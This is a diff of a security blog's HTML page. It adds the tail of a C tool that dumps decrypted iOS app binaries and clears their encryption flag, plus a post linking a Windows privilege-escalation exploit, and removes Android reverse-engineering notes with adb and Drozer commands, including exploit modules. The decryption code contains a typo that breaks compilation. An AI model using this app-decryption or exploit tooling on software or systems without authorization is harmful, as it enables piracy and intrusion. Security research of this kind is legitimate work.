+</span><span class='line'>                        <span class="n">fileoffs</span> <span class="o">=</span> <span class="n">swap32</span><span class="p">(</span><span class="n">arch</span><span class="o">-&gt;</span><span class="n">offset</span><span class="p">);</span>
+</span><span class='line'>                        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Correct arch is at offset %u in the file</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">fileoffs</span><span class="p">);</span>
+</span><span class='line'>                        <span class="k">break</span><span class="p">;</span>
+</span><span class='line'>                    <span class="p">}</span>
+</span><span class='line'>                    <span class="n">arch</span><span class="o">++</span><span class="p">;</span>
+</span><span class='line'>                <span class="p">}</span>
+</span><span class='line'>                <span class="k">if</span> <span class="p">(</span><span class="n">fileoffs</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[-] Could not find correct arch in FAT image</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>                    <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>                <span class="p">}</span>
+</span><span class='line'>            <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">fh</span><span class="o">-&gt;</span><span class="n">magic</span> <span class="o">==</span> <span class="n">MH_MAGIC</span> <span class="o">||</span> <span class="n">fh</span><span class="o">-&gt;</span><span class="n">magic</span> <span class="o">==</span> <span class="n">MH_MAGIC_64</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Executable is a plain MACH-O image</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span class='line'>                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[-] Executable is of unknown type</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>                <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>            <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">tmp</span> <span class="o">=</span> <span class="n">strrchr</span><span class="p">(</span><span class="n">rpath</span><span class="p">,</span> <span class="sc">&#39;/&#39;</span><span class="p">);</span>
+</span><span class='line'>            <span class="k">if</span> <span class="p">(</span><span class="n">tmp</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[-] Unexpected error with filename.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>                <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>            <span class="p">}</span>
+</span><span class='line'>            <span class="n">strlcpy</span><span class="p">(</span><span class="n">npath</span><span class="p">,</span> <span class="n">tmp</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">npath</span><span class="p">));</span>
+</span><span class='line'>            <span class="n">strlcat</span><span class="p">(</span><span class="n">npath</span><span class="p">,</span> <span class="s">&quot;.decrypted&quot;</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">npath</span><span class="p">));</span>
+</span><span class='line'>            <span class="n">strlcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">npath</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Opening %s for writing.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">npath</span><span class="p">);</span>
+</span><span class='line'>            <span class="n">outfd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">npath</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="o">|</span><span class="n">O_CREAT</span><span class="o">|</span><span class="n">O_TRUNC</span><span class="p">,</span> <span class="mo">0644</span><span class="p">);</span>
+</span><span class='line'>            <span class="k">if</span> <span class="p">(</span><span class="n">outfd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                <span class="k">if</span> <span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="s">&quot;/private/var/mobile/Applications/&quot;</span><span class="p">,</span> <span class="n">rpath</span><span class="p">,</span> <span class="mi">33</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[-] Failed opening. Most probably a sandbox issue. Trying something different.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>                    <span class="n">strlcpy</span><span class="p">(</span><span class="n">npath</span><span class="p">,</span> <span class="s">&quot;/private/var/mobile/Applications/&quot;</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">npath</span><span class="p">));</span>
+</span><span class='line'>                    <span class="n">tmp</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">rpath</span><span class="o">+</span><span class="mi">33</span><span class="p">,</span> <span class="sc">&#39;/&#39;</span><span class="p">);</span>
+</span><span class='line'>                    <span class="k">if</span> <span class="p">(</span><span class="n">tmp</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[-] Unexpected error with filename.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>                        <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>                    <span class="p">}</span>
+</span><span class='line'>                    <span class="n">tmp</span><span class="o">++</span><span class="p">;</span>
+</span><span class='line'>                    <span class="o">*</span><span class="n">tmp</span><span class="o">++</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>                    <span class="n">strlcat</span><span class="p">(</span><span class="n">npath</span><span class="p">,</span> <span class="n">rpath</span><span class="o">+</span><span class="mi">33</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">npath</span><span class="p">));</span>
+</span><span class='line'>                    <span class="n">strlcat</span><span class="p">(</span><span class="n">npath</span><span class="p">,</span> <span class="s">&quot;tmp/&quot;</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">npath</span><span class="p">));</span>
+</span><span class='line'>                    <span class="n">strlcat</span><span class="p">(</span><span class="n">npath</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">npath</span><span class="p">));</span>
+</span><span class='line'>                    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Opening %s for writing.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">npath</span><span class="p">);</span>
+</span><span class='line'>                    <span class="n">outfd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">npath</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="o">|</span><span class="n">O_CREAT</span><span class="o">|</span><span class="n">O_TRUNC</span><span class="p">,</span> <span class="mo">0644</span><span class="p">);</span>
+</span><span class='line'>                <span class="p">}</span>
+</span><span class='line'>                <span class="k">if</span> <span class="p">(</span><span class="n">outfd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                    <span class="n">perror</span><span class="p">(</span><span class="s">&quot;[-] Failed opening&quot;</span><span class="p">);</span>
+</span><span class='line'>                    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>                    <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>                <span class="p">}</span>
+</span><span class='line'>            <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">n</span> <span class="o">=</span> <span class="n">fileoffs</span> <span class="o">+</span> <span class="n">eic</span><span class="o">-&gt;</span><span class="n">cryptoff</span><span class="p">;</span>
+</span><span class='line'>            <span class="n">restsize</span> <span class="o">=</span> <span class="n">lseek</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">SEEK_END</span><span class="p">)</span><span class="o">-</span><span class="n">n</span><span class="o">-</span><span class="n">eic</span><span class="o">-&gt;</span><span class="n">cryptsize</span><span class="p">;</span>
+</span><span class='line'>            <span class="n">lseek</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">SEEK_SET</span><span class="p">);</span>
+</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Copying the not encrypted start of the file</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>            <span class="k">while</span> <span class="p">(</span><span class="n">n</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                <span class="n">toread</span> <span class="o">=</span> <span class="p">(</span><span class="n">n</span><span class="o">&gt;</span><span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">))</span> <span class="o">?</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span> <span class="o">:</span> <span class="n">n</span><span class="p">;</span>
+</span><span class='line'>                <span class="n">r</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="n">buffer</span><span class="p">,</span><span class="n">toread</span><span class="p">);</span>
+</span><span class='line'>                <span class="k">if</span> <span class="p">(</span><span class="n">r</span><span class="o">!=</span><span class="n">toread</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[-] Error reading file</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>                    <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>                <span class="p">}</span>
+</span><span class='line'>                <span class="n">n</span> <span class="o">-=</span> <span class="n">r</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>                <span class="n">r</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">outfd</span><span class="p">,</span><span class="n">buffer</span><span class="p">,</span><span class="n">toread</span><span class="p">);</span>
+</span><span class='line'>                <span class="k">if</span> <span class="p">(</span><span class="n">r</span><span class="o">!=</span><span class="n">toread</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[-] Error writing file</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>                    <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>                <span class="p">}</span>
+</span><span class='line'>            <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Dumping the decrypted data into the file</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>            <span class="n">r</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">outfd</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">pvars</span><span class="o">-&gt;</span><span class="n">mh</span><span class="o">+</span><span class="n">eic</span><span class="o">-&gt;</span><span class="n">cryptoff</span><span class="p">,</span><span class="n">eic</span><span class="o">-&gt;</span><span class="n">cryptsize</span><span class="p">);</span>
+</span><span class='line'>            <span class="k">if</span> <span class="p">(</span><span class="n">r</span><span class="o">!=</span><span class="n">eic</span><span class="o">-&gt;</span><span class="n">cryptsize</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[-] Error writing file</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>                <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>            <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">n</span> <span class="o">=</span> <span class="n">restsize</span><span class="p">;</span>
+</span><span class='line'>            <span class="n">lseek</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="n">eic</span><span class="o">-&gt;</span><span class="n">cryptsize</span><span class="p">,</span><span class="n">SEEK_CUR</span><span class="p">);</span>
+</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Copyting the not encrypted remainder of the file</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>            <span class="k">while</span> <span class="p">(</span><span class="n">n</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                <span class="n">toread</span> <span class="o">=</span> <span class="p">(</span><span class="n">n</span><span class="o">&gt;</span><span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">))</span> <span class="o">?</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span> <span class="o">:</span> <span class="n">n</span><span class="p">;</span>
+</span><span class='line'>                <span class="n">r</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="n">buffer</span><span class="p">,</span><span class="n">toread</span><span class="p">);</span>
+</span><span class='line'>                <span class="k">if</span> <span class="p">(</span><span class="n">r</span><span class="o">!=</span><span class="n">toread</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[-] Error reading file</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>                    <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>                <span class="p">}</span>
+</span><span class='line'>                <span class="n">n</span> <span class="o">-=</span> <span class="n">r</span><span class="p">;</span>
+</span><span class='line'>                <span class="n">r</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">outfd</span><span class="p">,</span><span class="n">buffer</span><span class="p">,</span><span class="n">toread</span><span class="p">);</span>
+</span><span class='line'>                <span class="k">if</span> <span class="p">(</span><span class="n">r</span><span class="o">!=</span><span class="n">toread</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[-] Error writing file</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>                    <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>                <span class="p">}</span>
+</span><span class='line'>            <span class="p">}</span>
+</span><span class='line'>            <span class="k">if</span> <span class="p">(</span><span class="n">off_cryptid</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                <span class="kt">uint32_t</span> <span class="n">zero</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>                <span class="n">off_cryptid</span><span class="o">+=</span><span class="n">fileoffs</span><span class="p">;</span>
+</span><span class='line'>                <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Setting the LC_ENCRYPTION_INFO-&gt;cryptid to 0 at offset %x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">off_cryptid</span><span class="p">);</span>
+</span><span class='line'>                <span class="k">if</span> <span class="p">(</span><span class="n">lseek</span><span class="p">(</span><span class="n">outfd</span><span class="p">,</span><span class="n">off_cryptid</span><span class="p">,</span><span class="n">SEEK_SET</span><span class="p">)</span><span class="o">!=</span><span class="n">off_cryptid</span><span class="o">||</span><span class="n">write</span><span class="p">(</span><span class="n">outfd</span><span class="p">,</span><span class="o">&amp;</span><span class="n">zero</span><span class="p">,</span><span class="mi">4</span><span class="p">)</span><span class="o">!=</span><span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>                    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[-] Error writing cryptid value</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>                <span class="p">}</span>
+</span><span class='line'>            <span class="p">}</span>
+</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Closing original file</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>            <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+</span><span class='line'>            <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Closing dump file</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>            <span class="n">close</span><span class="p">(</span><span class="n">outfd</span><span class="p">);</span>
+</span><span class='line'>            <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>        <span class="p">}</span>
+</span><span class='line'>        <span class="n">lc</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">load_command</span> <span class="o">*</span><span class="p">)((</span><span class="n">unsgined</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">lc</span><span class="o">+</span><span class="n">lc</span><span class="o">-&gt;</span><span class="n">cmdsize</span><span class="p">);</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;[-] This mach-o file is not encrypted. Nothing was decrypted.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/05/25/windows-8-dot-x-trackpopupmenu-privilege-escalation/">Windows 8.X TrackPopupMenu Privilege Escalation</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-05-25T23:02:30+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>25</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>11:02 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p><a href="http://packetstormsecurity.com/files/131964/trackpopupmenu-escalate.txt">Windows 8.x TrackPopupMenu Privilege Escalation</a></p>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -680,1313 +1384,6 @@ UID 는 코프로세서 밖으로 추출이 불가능하기때문에, 해당 아
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/05/21/some-android-books/">Some Android Books</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2015-05-21T00:43:52+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>21</span><span class='date-suffix'>st</span>, <span class='date-year'>2015</span></span> <span class='time'>12:43 am</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><h4>Bootstrapping</h4>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-<span class='line-number'>55</span>
-<span class='line-number'>56</span>
-<span class='line-number'>57</span>
-<span class='line-number'>58</span>
-<span class='line-number'>59</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>export PATH=$PATH:/path/to/sdk/tools/:/path/to/sdk/platform-tools/
-</span><span class='line'>
-</span><span class='line'># cd /usr/local/bin
-</span><span class='line'># ln -s /path/to/binary
-</span><span class='line'>
-</span><span class='line'>$ sudo apt-get install openjdk-6-jdk
-</span><span class='line'>
-</span><span class='line'>A 64-bit system requires an additional installation of 32-bit packages needed by the SDK tools.
-</span><span class='line'>You can install these on Ubuntu 13.04 upward by using
-</span><span class='line'>
-</span><span class='line'>$ sudo dpkg -add-architecture i386
-</span><span class='line'>$ sudo apt-get update
-</span><span class='line'>$ sudo apt-get install libncurses5:i386 libstdc++6:i386 zlib1g:i386
-</span><span class='line'>
-</span><span class='line'>Prior to that version of Ubuntu, you use the following command:
-</span><span class='line'>
-</span><span class='line'>$ sudo apt-get 
-</span><span class='line'>
-</span><span class='line'>$ android sdk
-</span><span class='line'>
-</span><span class='line'>$ android avd
-</span><span class='line'>
-</span><span class='line'>$ emulator -avd kitkat
-</span><span class='line'>
-</span><span class='line'>$ adb devices
-</span><span class='line'>
-</span><span class='line'>$ adb -s device_id shell
-</span><span class='line'>
-</span><span class='line'>$ nc localhost 5554
-</span><span class='line'>Android Console: type 'help' for a list of commands
-</span><span class='line'>OK
-</span><span class='line'>help
-</span><span class='line'>
-</span><span class='line'>* Genymotion (http://www.genymotion.com/)
-</span><span class='line'>* Virtualbox running Android x86 (http://www.android-x86.org)
-</span><span class='line'>* Youwave (https://youwave.com)
-</span><span class='line'>* WindowsAndroid (http://windowsandroid.en.softonic.com/)
-</span><span class='line'>
-</span><span class='line'>shell@android:/ $ ps
-</span><span class='line'>USER        PID     PPID        VSIZE       RSS     WCHAN       PC          NAME
-</span><span class='line'>
-</span><span class='line'>shell@android:/ # ls -l /data/data
-</span><span class='line'>...
-</span><span class='line'>drwxr-x--x u0_a46   u0_a46      2014-04-10 10:41 com.amazingutils.batterysaver
-</span><span class='line'>
-</span><span class='line'>class Test
-</span><span class='line'>{
-</span><span class='line'>    public static void main(String[] args)
-</span><span class='line'>    {
-</span><span class='line'>        System.out.println("It works! :D");
-</span><span class='line'>    }
-</span><span class='line'>}
-</span><span class='line'>
-</span><span class='line'>$ javac Test.java
-</span><span class='line'>$ dx -dex -output=test.jar Test.class
-</span><span class='line'>
-</span><span class='line'>$ adb push test.jar /data/local/tmp
-</span><span class='line'>$ adb shell dalvikvm -cp /data/local/tmp/test.jar Test
-</span><span class='line'>It works :D</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>Android Packages</h4>
-
-<p>Android applications are distributed in the form of a zipped archive with the file
-extension of .apk, which stands for Android Package. The official MIME-type of an
-Android Package is application/vnd.android.package-archive. These packages
-are nothing more than zip files containing the relevant compiled application code,
-resources, and application metadata required to define a complete application.
-According to Google&rsquo;s documentation at <a href="http://developer.android.com/tools/building/index.html,">http://developer.android.com/tools/building/index.html,</a>
-an APK is packaged by performing the following taks:</p>
-
-<ul>
-<li>An SDK tool named aapt (Android Asset Packaging Tool) converts all the XML resource files included
-in the application to a binary form. R.java is also produced by aapt to allow referencing of
-resources from code.</li>
-<li>A tool named aidl is used to convert any .aidl files to .java files containing a converted
-representation of it using a standard Java interface.</li>
-<li>All source code and converted output from aapt and aidl are compiled into .class files by
-the Java 1.6 compiler. This requires the android.jar file for your desired API version to be
-in the CLASSPATH environment variable.</li>
-<li>The dx utility is used to convert the produced .class files and any third-party libraries into a single
-classes.dex file.</li>
-<li>All compiled resources, non-compiled resouces (such as images or additional executables), and
-the application DEX file are used by the apkbuilder tool to package an APK file. More recent version of the
-SDK have deprecated the standalone apkbuilder tool and included it as a class inside sdklib.jar.
-The APK file is signed with a key using the jarsigner utility. It can either be signed by a default debug
-key or if it is going to production, it can be signed with your generated release key.</li>
-<li>If it is signed with a release key, the APK must be zip-aligned using the zipalign tool, which
-ensures that the application resources are aligned optimally for the way that they will be loaded into memory.
-The benefit of this is that the amount of RAM consumed when running the application is reduced.</li>
-</ul>
-
-
-<h4>Tools</h4>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ adb install /path/to/yourapplication.apk
-</span><span class='line'>$ adb shell pm
-</span><span class='line'>$ python -m  SimpleHTTPServer
-</span><span class='line'>
-</span><span class='line'>$ adb devices
-</span><span class='line'>$ adb shell
-</span><span class='line'>$ adb shell &lt;command&gt;
-</span><span class='line'>$ adb push /path/to/local/file /path/on/android/device
-</span><span class='line'>$ adb pull /path/on/android/device /path/to/local/file
-</span><span class='line'>$ adb forward tcp:&lt;local_port&gt; tcp:&lt;device_port&gt;
-</span><span class='line'>$ adb logcat
-</span><span class='line'>
-</span><span class='line'>http://www.busybox.net/downloads/binaries/
-</span><span class='line'>
-</span><span class='line'>$ adb push busybox-armv71 /data/local/tmp
-</span><span class='line'>shell@android:/ $ chmod 755 /data/local/tmp/busybox-armv71
-</span><span class='line'>sheel@android:/ $ export PATH=$PATH:/data/loal/tmp
-</span><span class='line'>
-</span><span class='line'>shell@android:/ $ pm list packages
-</span><span class='line'>shell@android:/ $ pm path &lt;package_name&gt;
-</span><span class='line'>shell@android:/ $ pm install /path/to/apk
-</span><span class='line'>shell@android:/ $ pm uninstall &lt;package_name&gt;
-</span><span class='line'>shell@android:/ $ pm disable &lt;package_name&gt;
-</span><span class='line'>shell@android:/ $ logcat
-</span><span class='line'>shell@android:/ $ logcat -s tag
-</span><span class='line'>
-</span><span class='line'>shell@android:/ $ getprop
-</span><span class='line'>shell@android:/ $ dumpsys
-</span><span class='line'>shell@android:/ $ service list</span></code></pre></td></tr></table></div></figure>
-
-
-<h4>Drozer</h4>
-
-<p><a href="https://www.mwrinfosecurity.com/products/drozer/community-edition/">Drozer</a></p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$ adb install agent.apk
-</span><span class='line'>$ adb forward tcp:31415 tcp:31415
-</span><span class='line'>$ drozer console connect
-</span><span class='line'>
-</span><span class='line'>dz&gt; list package
-</span><span class='line'>dz&gt; module search -d</span></code></pre></td></tr></table></div></figure>
-
-
-<p><a href="https://github.com/mwrlabs/drozer-modules/">Drozer modules</a></p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>app.activity
-</span><span class='line'>app.broadcast
-</span><span class='line'>app.package
-</span><span class='line'>app.provider
-</span><span class='line'>app.service
-</span><span class='line'>auxiliary
-</span><span class='line'>exploit.pilfer
-</span><span class='line'>exploit.root
-</span><span class='line'>information
-</span><span class='line'>scanner
-</span><span class='line'>shell
-</span><span class='line'>tools.file
-</span><span class='line'>tools.setup</span></code></pre></td></tr></table></div></figure>
-
-
-
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
